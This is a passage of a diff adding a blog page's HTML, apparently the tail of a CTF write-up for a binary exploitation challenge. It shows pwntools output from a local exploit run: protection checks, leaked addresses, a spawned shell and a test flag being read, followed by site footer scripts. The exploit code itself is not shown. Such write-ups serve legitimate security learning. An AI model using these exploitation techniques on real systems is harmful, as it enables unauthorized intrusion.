+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/pi/CTF/svattt/qual/pwn/convert/convert&#39;</span>
+</span></span><span style="display:flex;"><span>    Arch:     amd64-64-little
+</span></span><span style="display:flex;"><span>    RELRO:    Partial RELRO
+</span></span><span style="display:flex;"><span>    Stack:    No canary found
+</span></span><span style="display:flex;"><span>    NX:       NX enabled
+</span></span><span style="display:flex;"><span>    PIE:      PIE enabled
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>
+</span></span><span style="display:flex;"><span>    Arch:     amd64-64-little
+</span></span><span style="display:flex;"><span>    RELRO:    Partial RELRO
+</span></span><span style="display:flex;"><span>    Stack:    Canary found
+</span></span><span style="display:flex;"><span>    NX:       NX enabled
+</span></span><span style="display:flex;"><span>    PIE:      PIE enabled
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;./convert&#39;</span>: pid <span style="color:#ae81ff">27344</span>
+</span></span><span style="display:flex;"><span>0x5562deef7000
+</span></span><span style="display:flex;"><span>0x7fde9a293000
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Paused <span style="color:#f92672">(</span>press any to <span style="color:#66d9ef">continue</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ ls
+</span></span><span style="display:flex;"><span>convert  flag.txt  gadgets.txt    libc.so.6  solve.py
+</span></span><span style="display:flex;"><span>$ cat flag.txt
+</span></span><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>test_flag<span style="color:#f92672">}</span>
+</span></span></code></pre></div>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2022 <a href="https://pivik271.github.io/">pivik</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
